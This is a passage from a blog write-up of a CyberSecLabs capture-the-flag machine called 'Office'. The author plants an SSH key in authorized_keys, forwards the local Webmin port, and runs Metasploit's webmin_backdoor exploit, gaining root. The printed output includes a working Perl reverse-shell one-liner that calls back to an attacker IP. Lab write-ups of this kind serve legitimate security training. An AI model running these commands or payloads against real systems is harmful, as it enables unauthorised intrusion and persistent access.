ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPgHai3fDZqwsaQmTnVZcYGEkyQ3HqauRoDw83519IcId1kQxb+dtzC4ADYtXSLIzyc8H53dwW9aTIzX7j/lddQDfuqD4j7iJi8qMNMGtNQyrRdLRlxJPEo3M3Or0+qbaPMXfNVXfNnCFIeInzJhzLPKpZS5eYh7IJryhjEWwMHhm+mE+0xCd+z7FswoyKRSRIeR8hdeKhRuJ+UJTTD4GHI/6fOExMftoQwdfMUUon303/V6zwaky4s0d6R5OTesq/bcn2VE1CiDG/r29wSc5y44tHjyvfh80DkyaE8Yvr6j4PRxgAvRn7CP3CIBA67cHkXaHMV7i1rEJ8OEX/AEot dwight@office
dwight@office:~/.ssh$ echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPgHai3fDZqwsaQmTnVZcYGEkyQ3HqauRoDw83519IcId1kQxb+dtzC4ADYtXSLIzyc8H53dwW9aTIzX7j/lddQDfuqD4j7iJi8qMNMGtNQyrRdLRlxJPEo3M3Or0+qbaPMXfNVXfNnCFIeInzJhzLPKpZS5eYh7IJryhjEWwMHhm+mE+0xCd+z7FswoyKRSRIeR8hdeKhRuJ+UJTTD4GHI/6fOExMftoQwdfMUUon303/V6zwaky4s0d6R5OTesq/bcn2VE1CiDG/r29wSc5y44tHjyvfh80DkyaE8Yvr6j4PRxgAvRn7CP3CIBA67cHkXaHMV7i1rEJ8OEX/AEot dwight@office&#34; &gt; authorized_keys
&lt;HMV7i1rEJ8OEX/AEot dwight@office&#34; &gt; authorized_keys
</code></pre><p>Grab the <a href="http://localhost:1313/csl/office/id_rsa"><code>private key</code></a> and you got ssh access as dwight</p>
<p>Don&rsquo;t forget to fix the ssh key permissions</p>
<pre tabindex="0"><code>└──╼ $chmod 600 id_rsa

└──╼ $ssh dwight@172.31.3.1 -i id_rsa
...
dwight@office:~$ id
uid=1001(dwight) gid=1001(dwight) groups=1001(dwight)
</code></pre><p>I tried basic stuff like sudo and suid but no clue</p>
<p>I decided to o back to web folder to enumerate files&hellip;I already saw a <code>Webmin.out</code> file
when I took access as <code>www-data</code></p>
<p>and now I got a <code>/var/webmin</code> folder&hellip;unusual</p>
<pre tabindex="0"><code>dwight@office:/var$ ls -al
total 60
drwxr-xr-x 15 root root   4096 May  8  2020 .
drwxr-xr-x 24 root root   4096 May  8  2020 ..
drwxr-xr-x  2 root root   4096 May  9  2020 backups
drwxr-xr-x 12 root root   4096 May  8  2020 cache
drwxrwxrwt  2 root root   4096 Feb  3  2020 crash
drwxr-xr-x 40 root root   4096 May  8  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Feb  3  2020 lock -&gt; /run/lock
drwxrwxr-x 11 root syslog 4096 May  8  2020 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Feb  3  2020 run -&gt; /run
drwxr-xr-x  3 root root   4096 May  8  2020 snap
drwxr-xr-x  4 root root   4096 Feb  3  2020 spool
drwxrwxrwt  5 root root   4096 Nov 30 22:39 tmp
drwx------  3 root bin    4096 Nov 30 19:03 webmin
drwxr-xr-x  3 root root   4096 May  8  2020 www
</code></pre><p>Google (wikipedia) say its a web server interface for administration&hellip;</p>
<p>&hellip;that runs by default on <code>port 10000</code></p>
<p>you can confirm that with <code>netstat -tunlp</code></p>
<p>It runs locally (nmap didnt get that) we need to <code>port-forward</code> it to us</p>
<p>for that tunneling we can use <code>chisel</code> wich require uploading the server  or use <code>ssh</code></p>
<p>I go for ssh&hellip;choose any way you know&hellip;or not (XD I am personally learning it now..as I already know chisel and sshutle&hellip;)</p>
<p>SSH local Port Forwarding syntax :</p>
<p>ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER</p>
<p>Visit <code>127.0.0.1:port</code> for access</p>
<p>Aaaand it was hard to make it work&hellip;(timeout errors)</p>
<pre tabindex="0"><code>└──╼ $ssh -L 10000:127.0.0.1:10000 dwight@office.csl -i id_rsa -v

dwight@office:~$ debug1: Connection to port 10000 forwarding to 127.0.0.1 port 10000 requested.
debug1: channel 3: new [direct-tcpip]

...
</code></pre><p>we see the login portal but that&rsquo;s all, we have no valid creds</p>
<p>we fire metasploit and search for exploits</p>
<p>one is particulary interresting, its a backdoor payload we can install</p>
<pre tabindex="0"><code>msf6 exploit(linux/http/webmin_backdoor) &gt; options

msf6 exploit(linux/http/webmin_backdoor) &gt; set RHOSTS 127.0.0.1
RHOSTS =&gt; 127.0.0.1
msf6 exploit(linux/http/webmin_backdoor) &gt; set RPORT 10000
RPORT =&gt; 10000
msf6 exploit(linux/http/webmin_backdoor) &gt; set LHOST 10.10.0.223
LHOST =&gt; 10.10.0.223

msf6 exploit(linux/http/webmin_backdoor) &gt; run

[+] perl -MIO -e &#39;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,&#34;10.10.0.223:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};&#39;
[-] Handler failed to bind to 10.10.0.223:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Running automatic check (&#34;set AutoCheck false&#34; to disable)
[*] Webmin 1.890 detected
[+] Webmin 1.890 is a supported target
[+] Webmin executed a benign check command
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Generated command payload: perl -MIO -e &#39;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,&#34;10.10.0.223:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};&#39;
[*] Command shell session 1 opened (10.0.2.15:4444 -&gt; 10.0.2.2:48714) at 2021-12-01 01:37:47 +0100

id
uid=0(root) gid=0(root) groups=0(root)

shell
[*] Trying to find binary &#39;python&#39; on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary &#39;bash&#39; on the target machine
[*] Found bash at /bin/bash
cd /root
cd /root
root@office:~# ls
ls
system.txt
root@office:~# cat system.txt
cat system.txt
system_flag_here
</code></pre><p>the End! * insert the office ending theme here</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/cyberseclabs/">Cyberseclabs</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
